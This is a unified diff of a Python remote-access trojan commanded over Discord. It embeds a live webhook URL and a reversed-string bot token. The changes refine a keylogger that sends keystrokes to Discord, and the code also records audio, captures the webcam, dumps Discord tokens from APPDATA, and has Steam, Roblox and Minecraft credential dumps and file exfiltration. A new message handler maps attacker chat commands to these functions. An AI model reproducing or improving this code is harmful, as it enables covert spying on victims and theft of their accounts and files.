@@ -5,7 +5,7 @@ import json
 import os
 import threading
 from discord.ext import commands
-from pynput.keyboard import Listener, Key, KeyCode
+from pynput.keyboard import Listener, Key
 import wave
 import pyaudio
 import cv2
@@ -15,7 +15,7 @@ from Crypto.Cipher import AES
 import base64
 import logging
 import shutil
-import ctypes  # ✅ Fix: needed for MessageBoxA
+import ctypes
 
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1367882927429517354/QX90d-cK3ezsAbq8aH1jpTo9lPFuasPty_GDeixcUZTiZ6XyiiUausIJ_DIDPZS76IVH"
 TOKEN = "MTM2ODQ0MzMzOTI3NTM3NDY1Mg"[::-1] + ".oF0Ep8O1x3LEe96eNd5lf0Frfx6q9Jq0KqBJFA"[::-1]
@@ -40,12 +40,10 @@ def send_to_discord(message):
 
 def log_keystroke(key):
     try:
-        if isinstance(key, Key):
-            key_str = str(key)
-        else:
-            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
-        logging.info(key_str)
-        send_to_discord(key_str)
+        key_str = str(key).replace("'", "")
+        if "Key" not in key_str:
+            logging.info(key_str)
+            send_to_discord(key_str)
     except Exception as e:
         logging.error(f"Keylogging failed: {e}")
 
@@ -55,25 +53,19 @@ def start_keylogger():
             log_keystroke(key)
         except Exception as e:
             logging.error(f"Keylogger failed: {e}")
-            return False  # exit listener
+            return False
     try:
         with Listener(on_press=on_press) as listener:
             listener.join()
     except Exception as e:
         logging.error(f"Keylogger listener error: {e}")
 
-def safe_clipboard_check():
-    try:
-        return ImageGrab.grabclipboard()
-    except Exception:
-        return None  # silently ignore clipboard errors
-
 def record_audio(duration=30):
     try:
         p = pyaudio.PyAudio()
         stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
         frames = []
-        for i in range(0, int(44100 / 1024 * duration)):
+        for _ in range(0, int(44100 / 1024 * duration)):
             data = stream.read(1024)
             frames.append(data)
         stream.stop_stream()
@@ -106,7 +98,7 @@ def capture_webcam():
             filename = f"webcam_{int(time.time())}.png"
             cv2.imwrite(filename, frame)
             send_to_discord(f"Webcam photo saved as {filename}")
-            cap.release()
+        cap.release()
     except Exception as e:
         logging.error(f"Webcam capture failed: {e}")
 
@@ -133,7 +125,7 @@ def discord_dump():
         appdata = os.getenv('APPDATA')
         for root, dirs, files in os.walk(appdata):
             for file in files:
-                if file == 'Local\Discord\app-0.0.309\settings.json':
+                if file == 'settings.json' and 'Discord' in root:
                     with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                         data = f.read()
                         if 'token' in data:
@@ -184,19 +176,56 @@ def exfiltrate_files():
     except Exception as e:
         logging.error(f"File exfiltration failed: {e}")
 
-@bot.event
-async def on_message(message):
-    if message.author.bot:
-        return
-
-    cmd = message.content.strip().lstrip("!")
-    asyncio.create_task(handle_command(cmd))  # send command for processing
-
 def apply_rootkit_technique():
     try:
         ctypes.windll.user32.MessageBoxW(0, "Rootkit Technique Active", "System Alert", 1)
     except Exception as e:
         logging.error(f"Failed to apply rootkit technique: {e}")
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+
+    if message.content.startswith("!keylogger start"):
+        logging.info("Starting keylogger...")
+        threading.Thread(target=start_keylogger).start()
+
+    elif message.content.startswith("!record_audio"):
+        try:
+            duration = int(message.content.split(" ")[1])
+            logging.info(f"Recording audio for {duration} seconds...")
+            record_audio(duration)
+        except Exception as e:
+            logging.error(f"Audio command error: {e}")
+            send_to_discord("Usage: !record_audio <duration>")
+
+    elif message.content.startswith("!screenshot"):
+        capture_screenshot()
+
+    elif message.content.startswith("!start_webcam"):
+        capture_webcam()
+
+    elif message.content.startswith("!steamdump"):
+        steam_dump()
+
+    elif message.content.startswith("!discorddump"):
+        discord_dump()
+
+    elif message.content.startswith("!robloxdump"):
+        roblox_dump()
+
+    elif message.content.startswith("!minecraftdump"):
+        minecraft_dump()
+
+    elif message.content.startswith("!exfil_all"):
+        exfiltrate_files()
+
+    elif message.content == "!help":
+        send_to_discord("Help command list not implemented.")
+
+    else:
+        send_to_discord(f"Unknown command: {message.content}")
 
 async def setup():
     apply_rootkit_technique()
